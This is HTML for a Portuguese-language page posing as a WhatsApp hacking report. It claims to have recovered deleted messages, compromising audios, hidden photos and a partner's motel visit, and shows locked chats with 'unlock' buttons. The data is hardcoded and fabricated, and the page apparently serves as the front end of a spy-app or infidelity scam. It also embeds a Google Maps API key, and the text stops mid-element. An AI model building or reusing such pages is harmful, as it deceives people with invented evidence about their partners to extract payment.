<!DOCTYPE html><html lang="pt-BR"><head>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp - Relat√≥rio</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">

    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary-green: #25D366;
            --dark-green: #128C7E;
            --light-green: #DCF8C6;
            --background-color: #f5f5f5;
            --text-dark: #2c3e50;
            --text-light: #7f8c8d;
            --white: #ffffff;
            --danger: #ff3b30;
            --warning: #ffcc00;
            --success: #34c759;
            --border-radius: 12px;
            --shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
        }

        @keyframes spin { 
            0% { transform: rotate(0deg); } 
            100% { transform: rotate(360deg); } 
        } 
        @keyframes backdropFadeIn { 
            from { opacity: 0; } 
            to { opacity: 1; } 
        } 
        @keyframes popupSlideIn { 
            from { opacity: 0; transform: translateY(-20px); } 
            to { opacity: 1; transform: translateY(0); } 
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
        }

        body {
            background-color: var(--background-color);
            color: var(--text-dark);
            line-height: 1.6;
            padding-bottom: 60px;
        }

        .container {
            width: 100%;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
        }

        /* Header */
        .header {
            text-align: center;
            padding: 30px 0;
            background-color: var(--primary-green);
            color: white;
            border-radius: 0 0 var(--border-radius) var(--border-radius);
            margin-bottom: 30px;
            box-shadow: var(--shadow);
        }

        .header h1 {
            font-size: 2rem;
            margin-bottom: 10px;
            font-weight: 700;
        }

        .header p {
            font-size: 1rem;
            max-width: 600px;
            margin: 0 auto;
            opacity: 0.9;
        }

        /* Card Styles */
        .card {
            background-color: var(--white);
            border-radius: var(--border-radius);
            padding: 25px;
            margin-bottom: 25px;
            box-shadow: var(--shadow);
            opacity: 0;
            transform: translateY(20px);
            transition: opacity 0.5s ease, transform 0.5s ease;
        }

        .card.visible {
            opacity: 1;
            transform: translateY(0);
        }

        .card-title {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            color: var(--dark-green);
            font-weight: 600;
            font-size: 1.3rem;
        }

        .card-title svg {
            margin-right: 10px;
            fill: var(--primary-green);
            width: 24px;
            height: 24px;
        }

        .card-content {
            margin-bottom: 20px;
        }

        .highlight {
            color: var(--danger);
            font-weight: 600;
        }

        .warning {
            color: var(--warning);
            font-weight: 600;
        }

        .success {
            color: var(--success);
            font-weight: 600;
        }

        /* Conversation Block */
        .conversation-block {
            margin-top: 15px;
        }

        .contact-button {
            display: flex;
            align-items: center;
            background-color: var(--white);
            border: 1px solid #e0e0e0;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 15px;
            width: 100%;
            text-align: left;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .contact-button:hover {
            background-color: #f9f9f9;
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.05);
        }

        .contact-avatar {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background-size: cover;
            background-position: center;
            filter: blur(4px);
            display: inline-block;
        }

        .contact-info {
            flex: 1;
        }

        .contact-name {
            font-weight: 600;
            margin-bottom: 5px;
        }

        .contact-preview {
            font-size: 0.9rem;
            color: var(--text-light);
            display: flex;
            align-items: center;
        }

        .contact-preview svg {
            width: 16px;
            height: 16px;
            margin-right: 5px;
            fill: var(--danger);
        }

        .contact-time {
            font-size: 0.8rem;
            color: var(--text-light);
            white-space: nowrap;
        }

        /* Media Block */
        .media-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            margin-top: 20px;
        }

        .media-item {
            position: relative;
            border-radius: 8px;
            overflow: hidden;
            aspect-ratio: 1;
        }

        .media-item img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            filter: blur(4px);
        }

        .media-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: white;
            text-align: center;
            padding: 10px;
        }

        .media-overlay svg {
            width: 24px;
            height: 24px;
            margin-bottom: 10px;
            fill: white;
        }

        .audio-item {
            background-color: var(--light-green);
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
        }

        .audio-play {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background-color: var(--primary-green);
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            cursor: pointer;
            flex-shrink: 0;
        }

        .audio-play svg {
            width: 20px;
            height: 20px;
            fill: white;
        }

        .audio-waveform {
            flex: 1;
            height: 30px;
            background-image: url('images/waveform.png');
            background-size: contain;
            background-repeat: no-repeat;
            background-position: left center;
        }

        .audio-duration {
            font-size: 0.8rem;
            color: var(--text-light);
            margin-left: 10px;
        }

        /* Keywords Block */
        .keyword-list {
            margin-top: 15px;
        }

        .keyword-item {
            display: flex;
            justify-content: space-between;
            padding: 12px 0;
            border-bottom: 1px solid #eee;
        }

        .keyword-item:last-child {
            border-bottom: none;
        }

        .keyword-text {
            font-weight: 500;
        }

        .keyword-count {
            background-color: var(--primary-green);
            color: white;
            border-radius: 20px;
            padding: 2px 10px;
            font-size: 0.8rem;
            font-weight: 600;
        }

        /* Location Block */
        .location-map {
            width: 100%;
            height: 250px;
            border-radius: 10px;
            margin-top: 15px;
            margin-bottom: 15px;
            border: none;
        }

        .location-alert {
            display: flex;
            align-items: center;
            background-color: #fff3cd;
            border-left: 4px solid var(--warning);
            padding: 15px;
            border-radius: 5px;
            margin-top: 15px;
        }

        .location-alert svg {
            width: 20px;
            height: 20px;
            margin-right: 10px;
            fill: var(--warning);
        }

        /* CTA Button */
        .cta-button {
            display: block;
            width: 100%;
            background-color: var(--primary-green);
            color: white;
            border: none;
            border-radius: 30px;
            padding: 15px 20px;
            font-size: 1rem;
            font-weight: 600;
            text-align: center;
            cursor: pointer;
            transition: background-color 0.3s;
            margin-top: 20px;
            text-decoration: none;
            box-shadow: 0 4px 8px rgba(37, 211, 102, 0.3);
        }

        .cta-button:hover {
            background-color: var(--dark-green);
            transform: translateY(-2px);
            box-shadow: 0 6px 12px rgba(37, 211, 102, 0.4);
        }

        .cta-button svg {
            width: 16px;
            height: 16px;
            margin-right: 8px;
            fill: white;
            vertical-align: middle;
        }

        /* Chat Popup */
        .popup-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.3s, visibility 0.3s;
        }

        .popup-overlay.active {
            opacity: 1;
            visibility: visible;
        }

        .popup-content {
            width: 90%;
            max-width: 400px;
            background-color: white;
            border-radius: 15px;
            overflow: hidden;
            transform: scale(0.9);
            transition: transform 0.3s;
        }

        .popup-overlay.active .popup-content {
            transform: scale(1);
        }

        .popup-header {
            background-color: var(--dark-green);
            color: white;
            padding: 15px;
            display: flex;
            align-items: center;
        }

        .popup-close {
            background: none;
            border: none;
            color: white;
            font-size: 1.5rem;
            cursor: pointer;
            margin-right: 10px;
        }

        .popup-avatar {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background-size: cover;
            background-position: center;
            filter: blur(4px);
            display: inline-block;
        }

        .popup-name {
            font-weight: 600;
            flex: 1;
        }

        .popup-body {
            padding: 20px;
            background-color: #e5ddd5;
            height: 400px;
            overflow-y: auto;
        }

        .chat-message {
            max-width: 80%;
            padding: 10px 15px;
            border-radius: 10px;
            margin-bottom: 15px;
            position: relative;
            word-wrap: break-word;
        }

        .chat-message.received {
            background-color: white;
            align-self: flex-start;
            border-top-left-radius: 0;
        }

        .chat-message.sent {
            background-color: var(--light-green);
            align-self: flex-end;
            margin-left: auto;
            border-top-right-radius: 0;
        }

        .message-time {
            font-size: 0.7rem;
            color: var(--text-light);
            text-align: right;
            margin-top: 5px;
        }

        .message-status {
            display: inline-block;
            margin-left: 5px;
        }

        .message-status svg {
            width: 14px;
            height: 14px;
            fill: var(--primary-green);
        }

        .chat-audio {
            display: flex;
            align-items: center;
            padding: 5px 0;
        }

        .chat-audio-play {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            background-color: var(--primary-green);
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 10px;
            flex-shrink: 0;
        }

        .chat-audio-play svg {
            width: 16px;
            height: 16px;
            fill: white;
        }

        .chat-audio-waveform {
            flex: 1;
            height: 25px;
            background-image: url('images/waveform.png');
            background-size: contain;
            background-repeat: no-repeat;
            background-position: left center;
        }

        .chat-audio-duration {
            font-size: 0.7rem;
            color: var(--text-light);
            margin-left: 10px;
        }

        .chat-footer {
            padding: 15px;
            background-color: #f0f0f0;
            text-align: center;
        }

        .chat-lock-message {
            font-size: 0.9rem;
            color: var(--text-light);
            margin-bottom: 15px;
        }

        /* Floating CTA */
        .floating-cta {
            position: fixed;
            bottom: 20px;
            left: 0;
            width: 100%;
            padding: 0 20px;
            z-index: 100;
            text-align: center;
        }

        .floating-cta-button {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            background-color: var(--primary-green);
            color: white;
            border: none;
            border-radius: 30px;
            padding: 12px 25px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            text-decoration: none;
            /* animation removida para n√£o pulsar mais */
        }

        .floating-cta-button:hover {
            background-color: var(--dark-green);
            transform: translateY(-3px);
        }

        .floating-cta-button svg {
            width: 18px;
            height: 18px;
            margin-right: 8px;
            fill: white;
        }

        /* Responsive Styles */
        @media (max-width: 768px) {
            .header h1 {
                font-size: 1.7rem;
            }

            .header p {
                font-size: 0.9rem;
                padding: 0 15px;
            }

            .card {
                padding: 20px;
            }

            .card-title {
                font-size: 1.2rem;
            }

            .media-grid {
                grid-template-columns: repeat(2, 1fr);
            }

            .popup-content {
                width: 95%;
            }

            .popup-body {
                height: 350px;
            }
        }

        @media (max-width: 480px) {
            .header h1 {
                font-size: 1.5rem;
            }

            .header p {
                font-size: 0.85rem;
            }

            .card {
                padding: 15px;
            }

            .card-title {
                font-size: 1.1rem;
            }

            .contact-avatar {
                width: 40px;
                height: 40px;
                font-size: 16px;
            }

            .contact-name {
                font-size: 0.9rem;
            }

            .contact-preview {
                font-size: 0.8rem;
            }

            .media-grid {
                gap: 10px;
            }

            .popup-body {
                height: 300px;
            }

            .floating-cta-button {
                padding: 10px 20px;
                font-size: 0.9rem;
            }
        }

        #map-container {
            position: relative;
            width: 100%;
            height: 250px;
            margin-top: 0;
        }

        #map-iframe {
            width: 100%;
            height: 250px;
            border-radius: 10px;
            border: none;
            margin: 0;
            display: block;
        }

        #custom-pin {
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -100%);
            z-index: 2;
            pointer-events: none;
        }

        .pin-pulse {
            width: 32px;
            height: 32px;
            background: rgba(255, 59, 48, 0.25);
            border-radius: 50%;
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            animation: pulse 1.2s infinite;
        }

        .pin-head {
            width: 18px;
            height: 18px;
            background: #ff3b30;
            border: 3px solid #fff;
            border-radius: 50%;
            position: relative;
            z-index: 2;
            box-shadow: 0 2px 8px rgba(255, 59, 48, 0.25);
        }

        @keyframes pulse {
            0% {
                transform: translate(-50%, -50%) scale(1);
                opacity: 0.7;
            }

            70% {
                transform: translate(-50%, -50%) scale(1.5);
                opacity: 0;
            }

            100% {
                transform: translate(-50%, -50%) scale(1);
                opacity: 0;
            }
        }

        #info-window-custom {
            position: absolute;
            left: 50%;
            top: 30px;
            transform: translate(-50%, 0);
            z-index: 3;
            background: #fff;
            border-radius: 12px;
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.12);
            padding: 16px 18px 12px 18px;
            min-width: 220px;
            max-width: 300px;
            font-family: 'Poppins', sans-serif;
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            gap: 6px;
        }

        #info-window-custom[hidden] {
            display: none;
        }

        #close-info {
            position: absolute;
            top: 8px;
            right: 10px;
            background: none;
            border: none;
            font-size: 18px;
            color: #888;
            cursor: pointer;
        }
    </style>
</head>

<body>
    <!-- Header -->
    <header class="header">
        <h1>Relat√≥rio de Acesso ao WhatsApp</h1>
        <p>Confira abaixo os principais dados recuperados da an√°lise do n√∫mero informado.</p>
    </header>

    <div class="container">
        <!-- Conversation Analysis Block -->
        <div class="card visible" id="conversationCard">
            <div class="card-title">
                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                    <path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-2 12H6v-2h12v2zm0-3H6V9h12v2zm0-3H6V6h12v2z"></path>
                </svg>
                An√°lise de Conversas
            </div>
            <div class="card-content">
                <p><span class="highlight">148 conversas suspeitas</span> foram encontradas durante a an√°lise. O sistema
                    conseguiu recuperar <span class="warning">mensagens apagadas</span> e algumas foram classificadas
                    como <span class="highlight">cr√≠ticas</span> com base no conte√∫do.</p>
            </div>
            <p style="font-size: 0.9rem; color: var(--text-light); margin-top: 10px;">
                Toque em uma conversa abaixo para visualizar os detalhes.
            </p>

            <div class="conversation-block">
                <button class="contact-button" data-contact="1">
                    <div class="contact-avatar" style="background-image: url('images/pm01.jpg');"></div>
                    <div class="contact-info">
                        <div class="contact-name">+55 XX 9XXXX-8392</div>
                        <div class="contact-preview">
                            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                            </svg>
                            Mensagem apagada recuperada
                        </div>
                    </div>
                    <div class="contact-time">Ontem</div>
                </button>

                <button class="contact-button" data-contact="2">
                    <div class="contact-avatar" style="background-image: url('images/pm02.jpg');"></div>
                    <div class="contact-info">
                        <div class="contact-name">+55 XX 9XXXX-7381</div>
                        <div class="contact-preview">
                            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                            </svg>
                            √Åudio suspeito detectado
                        </div>
                    </div>
                    <div class="contact-time">3 dias</div>
                </button>

                <button class="contact-button" data-contact="3">
                    <div class="contact-avatar" style="background-image: url('images/pm03.jpg');"></div>
                    <div class="contact-info">
                        <div class="contact-name">+55 XX 9XXXX-0032</div>
                        <div class="contact-preview">
                            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                            </svg>
                            Fotos suspeitas encontradas
                        </div>
                    </div>
                    <div class="contact-time">1 semana</div>
                </button>
            </div>
        </div>

        <!-- Media Block -->
        <div class="card visible" id="mediaCard">
            <div class="card-title">
                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                    <path d="M21 19V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zM8.5 13.5l2.5 3.01L14.5 12l4.5 6H5l3.5-4.5z"></path>
                </svg>
                M√≠dia Recuperada
            </div>
            <div class="card-content">
                <p><span class="highlight">3 √°udios comprometedores</span> foram recuperados durante a an√°lise. Al√©m
                    disso, o sistema encontrou <span class="highlight">267 fotos apagadas</span> que podem conter
                    conte√∫do sens√≠vel.</p>

                <a href="#" class="cta-button">
                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 17c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm6-9h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6h1.9c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm0 12H6V10h12v10z"></path>
                    </svg>
                    DESBLOQUEAR √ÅUDIOS COMPLETOS
                </a>

                <div class="media-grid">
                    <div class="media-item">
                        <img src="images/m01.jpg" alt="Imagem borrada">
                        <div class="media-overlay">
                            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                <path d="M12 17c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm6-9h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6h1.9c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm0 12H6V10h12v10z"></path>
                            </svg>
                            Bloqueado
                        </div>
                    </div>
                    <div class="media-item">
                        <img src="images/m02.jpg" alt="Imagem borrada">
                        <div class="media-overlay">
                            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                <path d="M12 17c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm6-9h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6h1.9c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm0 12H6V10h12v10z"></path>
                            </svg>
                            Bloqueado
                        </div>
                    </div>
                    <div class="media-item">
                        <img src="images/m03.jpg" alt="Imagem borrada">
                        <div class="media-overlay">
                            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                <path d="M12 17c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm6-9h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6h1.9c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm0 12H6V10h12v10z"></path>
                            </svg>
                            Bloqueado
                        </div>
                    </div>
                    <div class="media-item">
                        <img src="images/m04.jpg" alt="Imagem borrada">
                        <div class="media-overlay">
                            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                <path d="M12 17c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm6-9h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6h1.9c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm0 12H6V10h12v10z"></path>
                            </svg>
                            Bloqueado
                        </div>
                    </div>
                    <div class="media-item">
                        <img src="images/m05.jpg" alt="Imagem borrada">
                        <div class="media-overlay">
                            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                <path d="M12 17c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm6-9h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6h1.9c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm0 12H6V10h12v10z"></path>
                            </svg>
                            Bloqueado
                        </div>
                    </div>
                    <div class="media-item">
                        <img src="images/m06.jpg" alt="Imagem borrada">
                        <div class="media-overlay">
                            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                <path d="M12 17c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm6-9h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6h1.9c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm0 12H6V10h12v10z"></path>
                            </svg>
                            Bloqueado
                        </div>
                    </div>
                </div>

                <a href="#" class="cta-button">
                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 17c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm6-9h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6h1.9c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm0 12H6V10h12v10z"></path>
                    </svg>
                    DESBLOQUEAR TODAS AS FOTOS
                </a>
            </div>
        </div>

        <!-- Keywords Block -->
        <div class="card" id="keywordsCard">
            <div class="card-title">
                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                    <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path>
                </svg>
                Palavras-chave Suspeitas
            </div>
            <div class="card-content">
                <p>O sistema escaneou <span class="highlight">4.327 mensagens</span> e identificou v√°rias palavras-chave
                    que podem indicar comportamento suspeito.</p>

                <div class="keyword-list">
                    <div class="keyword-item">
                        <div class="keyword-text">"Gostosa"</div>
                        <div class="keyword-count">13</div>
                    </div>
                    <div class="keyword-item">
                        <div class="keyword-text">"Amor"</div>
                        <div class="keyword-count">9</div>
                    </div>
                    <div class="keyword-item">
                        <div class="keyword-text">"Segredo"</div>
                        <div class="keyword-count">8</div>
                    </div>
                    <div class="keyword-item">
                        <div class="keyword-text">"Escondido"</div>
                        <div class="keyword-count">6</div>
                    </div>
                    <div class="keyword-item">
                        <div class="keyword-text">"N√£o conta"</div>
                        <div class="keyword-count">5</div>
                    </div>
                </div>

                <a href="#" class="cta-button">
                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 17c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm6-9h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6h1.9c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm0 12H6V10h12v10z"></path>
                    </svg>
                    VER TODAS AS MENSAGENS
                </a>
            </div>
        </div>

        <!-- Location Block -->
        <div class="card" id="locationCard">
            <div class="card-title">
                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"></path>
                </svg>
                Localiza√ß√£o Suspeita
            </div>
            <div class="card-content">
                <p id="map-dynamic-msg">O n√∫mero <strong></strong> esteve neste motel em <strong>S√£o Paulo</strong> nos √∫ltimos 7 dias. Abaixo est√° a localiza√ß√£o mais recente registrada.</p>

                <div id="map-container" style="position: relative; width: 100%; height: 250px; margin-top: 0;">
                    <iframe id="map-iframe" class="location-map" style="width: 100%; height: 250px; border-radius: 10px; border: none; margin: 0; display: block;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade" src="https://www.google.com/maps/embed/v1/place?key=AIzaSyAZnW7kz1R4UiARrZLtiiS7dHE9M2VmJBE&q=Motel+Sao+Paulo+SP"></iframe>
                    <div id="custom-pin" style="position: absolute; left: 50%; top: 50%; transform: translate(-50%, -100%); z-index: 2; pointer-events: none;">
                        <div class="pin-pulse"></div>
                        <div class="pin-head"></div>
                    </div>
                </div>

                <a href="#" class="cta-button">
                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 17c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm6-9h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6h1.9c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm0 12H6V10h12v10z"></path>
                    </svg>
                    VER HIST√ìRICO COMPLETO
                </a>
            </div>
        </div>
    </div>

    <!-- Chat Popups -->
    <div class="popup-overlay" id="chatPopup1">
        <div class="popup-content">
            <div class="popup-header">
                <button class="popup-close">√ó</button>
                <div class="popup-avatar" style="background-image: url('images/pm01.jpg');"></div>
                <div class="popup-name">+55 XX 9XXXX-8392</div>
            </div>
            <div class="popup-body">
                <div class="chat-message received">
                    Oi, tudo bem?
                    <div class="message-time">14:22</div>
                </div>

                <div class="chat-message sent">
                    Tudo sim e voc√™?
                    <div class="message-time">14:23
                        <span class="message-status">
                            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                <path d="M18 7l-1.41-1.41-6.34 6.34 1.41 1.41L18 7zm4.24-1.41L11.66 16.17 7.48 12l-1.41 1.41L11.66 19l12-12-1.42-1.41zM.41 13.41L6 19l1.41-1.41L1.83 12 .41 13.41z"></path>
                            </svg>
                        </span>
                    </div>
                </div>

                <div class="chat-message received">
                    <span class="highlight">Conte√∫do bloqueado</span>
                    <div class="message-time">14:25</div>
                </div>

                <div class="chat-message sent">
                    <span class="highlight">Conte√∫do bloqueado</span>
                    <div class="message-time">14:26
                        <span class="message-status">
                            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                <path d="M18 7l-1.41-1.41-6.34 6.34 1.41 1.41L18 7zm4.24-1.41L11.66 16.17 7.48 12l-1.41 1.41L11.66 19l12-12-1.42-1.41zM.41 13.41L6 19l1.41-1.41L1.83 12 .41 13.41z"></path>
                            </svg>
                        </span>
                    </div>
                </div>

                <div class="chat-message received">
                    <span class="highlight">Conte√∫do bloqueado</span>
                    <div class="message-time">14:28</div>
                </div>

                <div class="chat-message received">
                    <span class="highlight">Conte√∫do bloqueado</span>
                    <div class="message-time">14:30</div>
                </div>

                <div class="chat-message sent">
                    <span class="highlight">Conte√∫do bloqueado</span>
                    <div class="message-time">14:32
                        <span class="message-status">
                            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                <path d="M18 7l-1.41-1.41-6.34 6.34 1.41 1.41L18 7zm4.24-1.41L11.66 16.17 7.48 12l-1.41 1.41L11.66 19l12-12-1.42-1.41zM.41 13.41L6 19l1.41-1.41L1.83 12 .41 13.41z"></path>
                            </svg>
                        </span>
                    </div>
                </div>

                <div class="chat-message received">
                    <span class="highlight">Conte√∫do bloqueado</span>
                    <div class="message-time">14:33</div>
                </div>

                <div class="chat-message received">
                    <span class="highlight">Conte√∫do bloqueado</span>
                    <div class="message-time">14:35</div>
                </div>
            </div>
            <div class="chat-footer">
                <div class="chat-lock-message">Para visualizar a conversa completa, voc√™ precisa desbloquear as
                    conversas.</div>
                <a href="#" class="cta-button">
                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 17c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm6-9h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6h1.9c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm0 12H6V10h12v10z"></path>
                    </svg>
                    DESBLOQUEAR CONVERSAS COMPLETAS
                </a>
            </div>
        </div>
    </div>

    <div class="popup-overlay" id="chatPopup2">
        <div class="popup-content">
            <div class="popup-header">
                <button class="popup-close">√ó</button>
                <div class="popup-avatar" style="background-image: url('images/pm02.jpg');"></div>
                <div class="popup-name">+55 XX 9XXXX-7381</div>
            </div>
            <div class="popup-body">
                <div class="chat-message received">
                    Eiiii
                    <div class="message-time">09:15</div>
                </div>

                <div class="chat-message sent">
                    to aqui amor
                    <div class="message-time">09:17
                        <span class="message-status">
                            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                <path d="M18 7l-1.41-1.41-6.34 6.34 1.41 1.41L18 7zm4.24-1.41L11.66 16.17 7.48 12l-1.41 1.41L11.66 19l12-12-1.42-1.41zM.41 13.41L6 19l1.41-1.41L1.83 12 .41 13.41z"></path>
                            </svg>
                        </span>
                    </div>
                </div>

                <div class="chat-message received">
                    <span class="highlight">Conte√∫do bloqueado</span>
                    <div class="message-time">09:20</div>
                </div>

                <div class="chat-message sent">
